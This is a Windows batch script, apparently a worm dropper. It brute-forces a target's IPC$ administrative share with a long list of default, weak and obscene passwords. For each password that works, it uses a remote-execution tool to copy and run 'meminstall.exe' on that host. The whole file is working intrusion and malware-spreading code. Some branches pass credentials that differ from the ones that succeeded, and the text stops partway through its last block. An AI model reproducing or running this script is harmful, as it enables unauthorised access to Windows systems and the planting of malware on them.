@echo off
net use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto adad
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto blkad
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto adtest
net use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto adtestt
net use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto adtemp
net use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto adtempp
net use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto adpass
net use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto adpassw
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto adadmin
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto adminch
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
net use \\%1\ipc$ "1234" /user:Administrator
if not errorlevel 1 goto whee
net use \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto Administrator-qwerty
net use \\%1\ipc$ "qwerty123" /user:Administrator
if not errorlevel 1 goto Administrator-qwerty123
net use \\%1\ipc$ "Administrator1" /user:Administrator
if not errorlevel 1 goto Administrator-Administrator1
net use \\%1\ipc$ "Administrator123" /user:Administrator
if not errorlevel 1 goto Administrator-Administrator123
net use \\%1\ipc$ "system" /user:Administrator
if not errorlevel 1 goto Administrator-system
net use \\%1\ipc$ "netlink" /user:Administrator
if not errorlevel 1 goto Administrator-netlink
net use \\%1\ipc$ "manager" /user:Administrator
if not errorlevel 1 goto Administrator-manager
net use \\%1\ipc$ "operator" /user:Administrator
if not errorlevel 1 goto Administrator-operator
net use \\%1\ipc$ "fuck" /user:Administrator
if not errorlevel 1 goto Administrator-fuck
net use \\%1\ipc$ "fuckyou" /user:Administrator
if not errorlevel 1 goto Administrator-fuckyou
net use \\%1\ipc$ "penis" /user:Administrator
if not errorlevel 1 goto Administrator-penis
net use \\%1\ipc$ "dick" /user:Administrator
if not errorlevel 1 goto Administrator-dick
net use \\%1\ipc$ "cunt" /user:Administrator
if not errorlevel 1 goto Administrator-cunt
net use \\%1\ipc$ "cock" /user:Administrator
if not errorlevel 1 goto Administrator-cock
net use \\%1\ipc$ "fuckface" /user:Administrator
if not errorlevel 1 goto Administrator-fuckface
net use \\%1\ipc$ "die" /user:Administrator
if not errorlevel 1 goto Administrator-die
net use \\%1\ipc$ "hacker" /user:Administrator
if not errorlevel 1 goto Administrator-hacker
net use \\%1\ipc$ "database" /user:database
if not errorlevel 1 goto database-database
net use \\%1\ipc$ "123" /user:database
if not errorlevel 1 goto database-123
net use \\%1\ipc$ "password" /user:database
if not errorlevel 1 goto database-password
net use \\%1\ipc$ "pass" /user:database
if not errorlevel 1 goto database-pass
net use \\%1\ipc$ "datapass" /user:database
if not errorlevel 1 goto database-datapass
net use \\%1\ipc$ "adminpass" /user:Administrator
if not errorlevel 1 goto Administrator-adminpass
net use \\%1\ipc$ "aaa" /user:Administrator
if not errorlevel 1 goto Administrator-aaa
net use \\%1\ipc$ "abc" /user:Administrator
if not errorlevel 1 goto Administrator-abc
net use \\%1\ipc$ "abcd" /user:Administrator
if not errorlevel 1 goto Administrator-abcd
net use \\%1\ipc$ "access" /user:Administrator
if not errorlevel 1 goto Administrator-access
net use \\%1\ipc$ "help" /user:Administrator
if not errorlevel 1 goto Administrator-help
net use \\%1\ipc$ "asd" /user:Administrator
if not errorlevel 1 goto Administrator-asd
net use \\%1\ipc$ "asm" /user:Administrator
if not errorlevel 1 goto Administrator-asm
net use \\%1\ipc$ "asdf" /user:Administrator
if not errorlevel 1 goto Administrator-asdf
net use \\%1\ipc$ "fdsa" /user:Administrator
if not errorlevel 1 goto Administrator-fdsa
net use \\%1\ipc$ "ibm" /user:Administrator
if not errorlevel 1 goto Administrator-ibm
net use \\%1\ipc$ "!@#$" /user:Administrator
if not errorlevel 1 goto Administrator-!@#$
net use \\%1\ipc$ "!@#" /user:Administrator
if not errorlevel 1 goto Administrator-!@#
net use \\%1\ipc$ "!@#$%" /user:Administrator
if not errorlevel 1 goto Administrator-!@#$%
net use \\%1\ipc$ "!@#$%^" /user:Administrator
if not errorlevel 1 goto Administrator-!@#$%^
net use \\%1\ipc$ "modem" /user:Administrator
if not errorlevel 1 goto Administrator-modem
net use \\%1\ipc$ "xyz" /user:Administrator
if not errorlevel 1 goto Administrator-xyz
net use \\%1\ipc$ "unix" /user:Administrator
if not errorlevel 1 goto Administrator-unix
net use \\%1\ipc$ "windows" /user:Administrator
if not errorlevel 1 goto Administrator-windows
net use \\%1\ipc$ "sys" /user:Administrator
if not errorlevel 1 goto Administrator-sys
net use \\%1\ipc$ "sex" /user:Administrator
if not errorlevel 1 goto Administrator-sex
net use \\%1\ipc$ "new" /user:Administrator
if not errorlevel 1 goto Administrator-new
net use \\%1\ipc$ "hack" /user:Administrator
if not errorlevel 1 goto Administrator-hack
net use \\%1\ipc$ "disc" /user:Administrator
if not errorlevel 1 goto Administrator-disc
net use \\%1\ipc$ "dos" /user:Administrator
if not errorlevel 1 goto Administrator-dos
net use \\%1\ipc$ "dog" /user:Administrator
if not errorlevel 1 goto Administrator-dog
net use \\%1\ipc$ "cat" /user:Administrator
if not errorlevel 1 goto Administrator-cat
net use \\%1\ipc$ "compaq" /user:Administrator
if not errorlevel 1 goto Administrator-compaq
net use \\%1\ipc$ "passw0rd" /user:Administrator
if not errorlevel 1 goto Administrator-passw0rd
net use \\%1\ipc$ "letmein" /user:Administrator
if not errorlevel 1 goto Administrator-letmein
net use \\%1\ipc$ "manager" /user:Administrator
if not errorlevel 1 goto Administrator-manager
net use \\%1\ipc$ "-" /user:Administrator
if not errorlevel 1 goto Administrator--
net use \\%1\ipc$ "security" /user:Administrator
if not errorlevel 1 goto Administrator-security
net use \\%1\ipc$ "adm" /user:Administrator
if not errorlevel 1 goto Administrator-adm
net use \\%1\ipc$ "debug" /user:Administrator
if not errorlevel 1 goto Administrator-debug
net use \\%1\ipc$ "tech" /user:Administrator
if not errorlevel 1 goto Administrator-tech
net use \\%1\ipc$ "monitor" /user:Administrator
if not errorlevel 1 goto Administrator-monitor
net use \\%1\ipc$ "god123" /user:Administrator
if not errorlevel 1 goto Administrator-god123
net use \\%1\ipc$ "user" /user:Administrator
if not errorlevel 1 goto Administrator-user
net use \\%1\ipc$ "none" /user:Administrator
if not errorlevel 1 goto Administrator-none
net use \\%1\ipc$ "None" /user:Administrator
if not errorlevel 1 goto Administrator-None
net use \\%1\ipc$ "r00t" /user:Administrator
if not errorlevel 1 goto Administrator-r00t
net use \\%1\ipc$ "hello" /user:Administrator
if not errorlevel 1 goto Administrator-hello
net use \\%1\ipc$ "hello1" /user:Administrator
if not errorlevel 1 goto Administrator-hello1
net use \\%1\ipc$ "blank" /user:Administrator
if not errorlevel 1 goto Administrator-blank
net use \\%1\ipc$ "00000" /user:Administrator
if not errorlevel 1 goto Administrator-00000
net use \\%1\ipc$ "99999" /user:Administrator
if not errorlevel 1 goto Administrator-99999
net use \\%1\ipc$ "gateway" /user:Administrator
if not errorlevel 1 goto Administrator-gateway
net use \\%1\ipc$ "p4ssw0rd" /user:Administrator
if not errorlevel 1 goto Administrator-p4ssw0rd
net use \\%1\ipc$ "daffyduck" /user:Administrator
if not errorlevel 1 goto Administrator-daffyduck
net use \\%1\ipc$ "testing" /user:Administrator
if not errorlevel 1 goto Administrator-testing
net use \\%1\ipc$ "testtest" /user:Administrator
if not errorlevel 1 goto Administrator-testtest
net use \\%1\ipc$ "weed" /user:Administrator
if not errorlevel 1 goto Administrator-weed
net use \\%1\ipc$ "qwertyuiop[]" /user:Administrator
if not errorlevel 1 goto Administrator-qwertyuiop[]
net use \\%1\ipc$ "ohio" /user:Administrator
if not errorlevel 1 goto Administrator-ohio
net use \\%1\ipc$ "texas" /user:Administrator
if not errorlevel 1 goto Administrator-texas
net use \\%1\ipc$ "california" /user:Administrator
if not errorlevel 1 goto Administrator-california
net use \\%1\ipc$ "parsnip" /user:Administrator
if not errorlevel 1 goto Administrator-parsnip
net use \\%1\ipc$ "carrot" /user:Administrator
if not errorlevel 1 goto Administrator-carrot
net use \\%1\ipc$ "egg" /user:Administrator
if not errorlevel 1 goto Administrator-egg
net use \\%1\ipc$ "apple" /user:Administrator
if not errorlevel 1 goto Administrator-apple
net use \\%1\ipc$ "slut" /user:Administrator
if not errorlevel 1 goto Administrator-slut
net use \\%1\ipc$ "asdfghjkl" /user:Administrator
if not errorlevel 1 goto Administrator-asdfghjkl
net use \\%1\ipc$ "zxcvbnm" /user:Administrator
if not errorlevel 1 goto Administrator-zxcvbnm
net use \\%1\ipc$ "10987654321" /user:Administrator
if not errorlevel 1 goto Administrator-10987654321
net use \\%1\ipc$ "sweetspud" /user:Administrator
if not errorlevel 1 goto Administrator-sweetspud
net use \\%1\ipc$ "secret" /user:Administrator
if not errorlevel 1 goto Administrator-secret
net use \\%1\ipc$ "windowsnt" /user:Administrator
if not errorlevel 1 goto Administrator-windowsnt
net use \\%1\ipc$ "winnt" /user:Administrator
if not errorlevel 1 goto Administrator-winnt
net use \\%1\ipc$ "win2k" /user:Administrator
if not errorlevel 1 goto Administrator-win2k
net use \\%1\ipc$ "win2000" /user:Administrator
if not errorlevel 1 goto Administrator-win2000
net use \\%1\ipc$ "win98" /user:Administrator
if not errorlevel 1 goto Administrator-win98
net use \\%1\ipc$ "win95" /user:Administrator
if not errorlevel 1 goto Administrator-win95
net use \\%1\ipc$ "winxp" /user:Administrator
if not errorlevel 1 goto Administrator-winxp
net use \\%1\ipc$ "windowsxp" /user:Administrator
if not errorlevel 1 goto Administrator-windowsxp
net use \\%1\ipc$ "windows2000" /user:Administrator
if not errorlevel 1 goto Administrator-windows2000
net use \\%1\ipc$ "rotartsinimda" /user:Administrator
if not errorlevel 1 goto Administrator-rotartsinimda
goto end
:blkad
findin \\%1 -u Administrator -p "" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "" -d meminstall.exe -o
goto end
:whee
findin \\%1 -u Administrator -p "1234" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "1234" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "1234" -d meminstall.exe -o
goto end
:adad
findin \\%1 -u Administrator -p "admin" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "admin" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "admin" -d meminstall.exe -o
goto end
:adadmin
findin \\%1 -u Administrator -p "administrator" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "administrator" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "administrator" -d meminstall.exe -o
goto end
:rootroot
findin \\%1 -u root -p "root" -d attrib.exe -r meminstall.exe
findin \\%1 -u root -p "root" -f -c -d meminstall.exe -o
findin \\%1 -u root -p "root" -d meminstall.exe -o
goto end
:adminad
findin \\%1 -u admin -p "admin" -d attrib.exe -r meminstall.exe
findin \\%1 -u admin -p "admin" -f -c -d meminstall.exe -o
findin \\%1 -u admin -p "admin" -d meminstall.exe -o
goto end
:adtest
findin \\%1 -u administrator -p "test" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "test" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "test" -d meminstall.exe -o
goto end
:testt
findin \\%1 -u test -p "test" -d attrib.exe -r meminstall.exe
findin \\%1 -u test -p "test" -f -c -d meminstall.exe -o
findin \\%1 -u test -p "test" -d meminstall.exe -o
goto end
:adtestt
findin \\%1 -u administrator -p "test123" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "test123" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "test123" -d meminstall.exe -o
goto end
:adtemp
findin \\%1 -u administrator -p "temp" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "temp" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "temp" -d meminstall.exe -o
goto end
:adtempp
findin \\%1 -u administrator -p "temp123" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "temp123" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "temp123" -d meminstall.exe -o
goto end
:adpass
findin \\%1 -u administrator -p "pass" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "pass" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "pass" -d meminstall.exe -o
goto end
:adpassw
findin \\%1 -u administrator -p "password" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "password" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "password" -d meminstall.exe -o
goto end
:adminch
findin \\%1 -u administrator -p "changeme" -d attrib.exe -r meminstall.exe
findin \\%1 -u administrator -p "changeme" -f -c -d meminstall.exe -o
findin \\%1 -u administrator -p "changeme" -d meminstall.exe -o
goto end
:Administrator-qwerty
findin \\%1 -u Administrator -p "qwerty" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "qwerty" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "qwerty" -d meminstall.exe -o
goto end
:Administrator-qwerty123
findin \\%1 -u Administrator -p "qwerty123" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "qwerty123" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "qwerty123" -d meminstall.exe -o
goto end
:Administrator-Administrator1
findin \\%1 -u Administrator -p "Administrator1" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "Administrator1" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "Administrator1" -d meminstall.exe -o
goto end
:Administrator-Administrator123
findin \\%1 -u Administrator -p "Administrator123" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "Administrator123" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "Administrator123" -d meminstall.exe -o
goto end
:Administrator-system
findin \\%1 -u Administrator -p "system" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "system" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "system" -d meminstall.exe -o
goto end
:Administrator-netlink
findin \\%1 -u Administrator -p "netlink" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "netlink" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "netlink" -d meminstall.exe -o
goto end
:Administrator-manager
findin \\%1 -u Administrator -p "manager" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "manager" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "manager" -d meminstall.exe -o
goto end
:Administrator-operator
findin \\%1 -u Administrator -p "operator" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "operator" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "operator" -d meminstall.exe -o
goto end
:Administrator-fuck
findin \\%1 -u Administrator -p "fuck" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "fuck" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "fuck" -d meminstall.exe -o
goto end
:Administrator-fuckyou
findin \\%1 -u Administrator -p "fuckyou" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "fuckyou" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "fuckyou" -d meminstall.exe -o
goto end
:Administrator-penis
findin \\%1 -u Administrator -p "penis" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "penis" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "penis" -d meminstall.exe -o
goto end
:Administrator-dick
findin \\%1 -u Administrator -p "dick" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "dick" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "dick" -d meminstall.exe -o
goto end
:Administrator-cunt
findin \\%1 -u Administrator -p "cunt" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "cunt" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "cunt" -d meminstall.exe -o
goto end
:Administrator-cock
findin \\%1 -u Administrator -p "cock" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "cock" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "cock" -d meminstall.exe -o
goto end
:Administrator-fuckface
findin \\%1 -u Administrator -p "fuckface" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "fuckface" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "fuckface" -d meminstall.exe -o
goto end
:Administrator-die
findin \\%1 -u Administrator -p "die" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "die" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "die" -d meminstall.exe -o
goto end
:Administrator-hacker
findin \\%1 -u Administrator -p "hacker" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "hacker" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "hacker" -d meminstall.exe -o
goto end
:database-database
findin \\%1 -u database -p "database" -d attrib.exe -r meminstall.exe
findin \\%1 -u database -p "database" -f -c -d meminstall.exe -o
findin \\%1 -u database -p "database" -d meminstall.exe -o
goto end
:database-123
findin \\%1 -u database -p "123" -d attrib.exe -r meminstall.exe
findin \\%1 -u database -p "123" -f -c -d meminstall.exe -o
findin \\%1 -u database -p "123" -d meminstall.exe -o
goto end
:database-password
findin \\%1 -u database -p "password" -d attrib.exe -r meminstall.exe
findin \\%1 -u database -p "password" -f -c -d meminstall.exe -o
findin \\%1 -u database -p "password" -d meminstall.exe -o
goto end
:database-pass
findin \\%1 -u database -p "pass" -d attrib.exe -r meminstall.exe
findin \\%1 -u database -p "pass" -f -c -d meminstall.exe -o
findin \\%1 -u database -p "pass" -d meminstall.exe -o
goto end
:database-datapass
findin \\%1 -u database -p "datapass" -d attrib.exe -r meminstall.exe
findin \\%1 -u database -p "datapass" -f -c -d meminstall.exe -o
findin \\%1 -u database -p "datapass" -d meminstall.exe -o
goto end
:Administrator-adminpass
findin \\%1 -u Administrator -p "adminpass" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "adminpass" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "adminpass" -d meminstall.exe -o
goto end
:Administrator-aaa
findin \\%1 -u Administrator -p "aaa" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "aaa" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "aaa" -d meminstall.exe -o
goto end
:Administrator-abc
findin \\%1 -u Administrator -p "abc" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "abc" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "abc" -d meminstall.exe -o
goto end
:Administrator-abcd
findin \\%1 -u Administrator -p "abcd" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "abcd" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "abcd" -d meminstall.exe -o
goto end
:Administrator-access
findin \\%1 -u Administrator -p "access" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "access" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "access" -d meminstall.exe -o
goto end
:Administrator-help
findin \\%1 -u Administrator -p "help" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "help" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "help" -d meminstall.exe -o
goto end
:Administrator-asd
findin \\%1 -u Administrator -p "asd" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "asd" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "asd" -d meminstall.exe -o
goto end
:Administrator-asm
findin \\%1 -u Administrator -p "asm" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "asm" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "asm" -d meminstall.exe -o
goto end
:Administrator-asdf
findin \\%1 -u Administrator -p "asdf" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "asdf" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "asdf" -d meminstall.exe -o
goto end
:Administrator-fdsa
findin \\%1 -u Administrator -p "fdsa" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "fdsa" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "fdsa" -d meminstall.exe -o
goto end
:Administrator-ibm
findin \\%1 -u Administrator -p "ibm" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "ibm" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "ibm" -d meminstall.exe -o
goto end
:Administrator-!@#$
findin \\%1 -u Administrator -p "!@#$" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "!@#$" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "!@#$" -d meminstall.exe -o
goto end
:Administrator-!@#
findin \\%1 -u Administrator -p "!@#" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "!@#" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "!@#" -d meminstall.exe -o
goto end
:Administrator-!@#$%
findin \\%1 -u Administrator -p "!@#$%" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "!@#$%" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "!@#$%" -d meminstall.exe -o
goto end
:Administrator-!@#$%^
findin \\%1 -u Administrator -p "!@#$%^" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "!@#$%^" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "!@#$%^" -d meminstall.exe -o
goto end
:Administrator-modem
findin \\%1 -u Administrator -p "modem" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "modem" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "modem" -d meminstall.exe -o
goto end
:Administrator-xyz
findin \\%1 -u Administrator -p "xyz" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "xyz" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "xyz" -d meminstall.exe -o
goto end
:Administrator-unix
findin \\%1 -u Administrator -p "unix" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "unix" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "unix" -d meminstall.exe -o
goto end
:Administrator-windows
findin \\%1 -u Administrator -p "windows" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "windows" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "windows" -d meminstall.exe -o
goto end
:Administrator-sys
findin \\%1 -u Administrator -p "sys" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "sys" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "sys" -d meminstall.exe -o
goto end
:Administrator-sex
findin \\%1 -u Administrator -p "sex" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "sex" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "sex" -d meminstall.exe -o
goto end
:Administrator-new
findin \\%1 -u Administrator -p "new" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "new" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "new" -d meminstall.exe -o
goto end
:Administrator-hack
findin \\%1 -u Administrator -p "hack" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "hack" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "hack" -d meminstall.exe -o
goto end
:Administrator-disc
findin \\%1 -u Administrator -p "disc" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "disc" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "disc" -d meminstall.exe -o
goto end
:Administrator-dos
findin \\%1 -u Administrator -p "dos" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "dos" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "dos" -d meminstall.exe -o
goto end
:Administrator-dog
findin \\%1 -u Administrator -p "dog" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "dog" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "dog" -d meminstall.exe -o
goto end
:Administrator-cat
findin \\%1 -u Administrator -p "cat" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "cat" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "cat" -d meminstall.exe -o
goto end
:Administrator-compaq
findin \\%1 -u Administrator -p "compaq" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "compaq" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "compaq" -d meminstall.exe -o
goto end
:Administrator-passw0rd
findin \\%1 -u Administrator -p "passw0rd" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "passw0rd" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "passw0rd" -d meminstall.exe -o
goto end
:Administrator-letmein
findin \\%1 -u Administrator -p "letmein" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "letmein" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "letmein" -d meminstall.exe -o
goto end
:Administrator-manager
findin \\%1 -u Administrator -p "manager" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "manager" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "manager" -d meminstall.exe -o
goto end
:Administrator--
findin \\%1 -u Administrator -p "-" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "-" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "-" -d meminstall.exe -o
goto end
:Administrator-security
findin \\%1 -u Administrator -p "security" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "security" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "security" -d meminstall.exe -o
goto end
:Administrator-adm
findin \\%1 -u Administrator -p "adm" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "adm" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "adm" -d meminstall.exe -o
goto end
:Administrator-debug
findin \\%1 -u Administrator -p "debug" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "debug" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "debug" -d meminstall.exe -o
goto end
:Administrator-tech
findin \\%1 -u Administrator -p "tech" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "tech" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "tech" -d meminstall.exe -o
goto end
:Administrator-monitor
findin \\%1 -u Administrator -p "monitor" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "monitor" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "monitor" -d meminstall.exe -o
goto end
:Administrator-god123
findin \\%1 -u Administrator -p "god123" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "god123" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "god123" -d meminstall.exe -o
goto end
:Administrator-user
findin \\%1 -u Administrator -p "user" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "user" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "user" -d meminstall.exe -o
goto end
:Administrator-none
findin \\%1 -u Administrator -p "none" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "none" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "none" -d meminstall.exe -o
goto end
:Administrator-None
findin \\%1 -u Administrator -p "None" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "None" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "None" -d meminstall.exe -o
goto end
:Administrator-r00t
findin \\%1 -u Administrator -p "r00t" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "r00t" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "r00t" -d meminstall.exe -o
goto end
:Administrator-hello
findin \\%1 -u Administrator -p "hello" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "hello" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "hello" -d meminstall.exe -o
goto end
:Administrator-hello1
findin \\%1 -u Administrator -p "hello1" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "hello1" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "hello1" -d meminstall.exe -o
goto end
:Administrator-blank
findin \\%1 -u Administrator -p "blank" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "blank" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "blank" -d meminstall.exe -o
goto end
:Administrator-00000
findin \\%1 -u Administrator -p "00000" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "00000" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "00000" -d meminstall.exe -o
goto end
:Administrator-99999
findin \\%1 -u Administrator -p "99999" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "99999" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "99999" -d meminstall.exe -o
goto end
:Administrator-gateway
findin \\%1 -u Administrator -p "gateway" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "gateway" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "gateway" -d meminstall.exe -o
goto end
:Administrator-p4ssw0rd
findin \\%1 -u Administrator -p "p4ssw0rd" -d attrib.exe -r meminstall.exe
findin \\%1 -u Administrator -p "p4ssw0rd" -f -c -d meminstall.exe -o
findin \\%1 -u Administrator -p "p4ssw0rd" -d meminstall.exe -o
goto end
:Administrator-daffyduck
findin \\%1 -u Administrator -p "daffyduck" -d attrib.exe -r meminstall.exe
